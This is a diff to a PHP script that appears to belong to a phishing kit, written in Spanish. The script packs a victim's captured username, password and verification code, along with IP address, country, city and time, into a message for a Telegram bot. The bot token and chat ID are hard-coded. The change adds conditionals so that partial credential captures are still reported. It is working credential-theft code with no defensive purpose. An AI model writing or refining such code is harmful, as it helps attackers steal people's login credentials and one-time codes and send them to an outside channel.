@@ -28,11 +28,21 @@ $token = "8687740380:AAGWDU18CPeXsMWhpzy1n6uZ-MkeTxWYYUo";
 $chat_id = "8448767308";
 
 // 🧾 MENSAJE
-$mensaje = "💳 DATOS COMPLETOS\n\n";
-$mensaje .= "👤 Usuario: $usuario\n";
-$mensaje .= "🔑 Clave: $clave\n";
-$mensaje .= "📲 Código: $codigo\n\n";
-$mensaje .= "🌐 IP: $ip\n";
+$mensaje = "💳 NUEVO ACCESO\n\n";
+
+if($usuario){
+    $mensaje .= "👤 Usuario: $usuario\n";
+}
+
+if($clave){
+    $mensaje .= "🔑 Clave: $clave\n";
+}
+
+if($codigo){
+    $mensaje .= "📲 Código: $codigo\n";
+}
+
+$mensaje .= "\n🌐 IP: $ip\n";
 $mensaje .= "📍 País: $pais\n";
 $mensaje .= "🏙 Ciudad: $ciudad\n";
 $mensaje .= "🕒 Hora: $fecha";
